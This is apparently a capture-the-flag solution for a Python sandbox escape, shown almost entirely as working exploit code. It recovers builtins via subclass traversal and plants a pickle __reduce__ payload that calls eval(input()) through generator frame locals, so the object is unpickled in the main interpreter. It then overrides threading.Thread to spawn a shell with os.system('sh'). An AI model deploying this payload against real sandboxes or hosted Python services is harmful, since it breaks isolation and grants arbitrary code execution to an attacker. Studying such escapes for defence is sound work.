# Solution

As per <https://docs.python.org/3.14/library/concurrent.interpreters.html#interp-object-sharing>
> By default, most objects are copied with `pickle` when they are passed to another interpreter.

Solution
```python
# Return an object with a __reduce__ method, classic pickle unserialize
(b:=().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__, b['globals']().update({'__builtins__': b}), b['exec']("class PAYLOAD():\n def __reduce__(self):\n  command=\"eval(input('PAYLOAD 2:'))\"\n  return (eval, (command,))"), x:=[], x.append(y.gi_frame.f_back.f_back.f_locals for y in x), z:=[*x[0]], z[0].update({"success":PAYLOAD()}))

# This will run when the `success` variable is un-pickled, in the main interpreter
(exec("threading.Thread = lambda **_:__import__('os').system('sh')"), True)[1]
```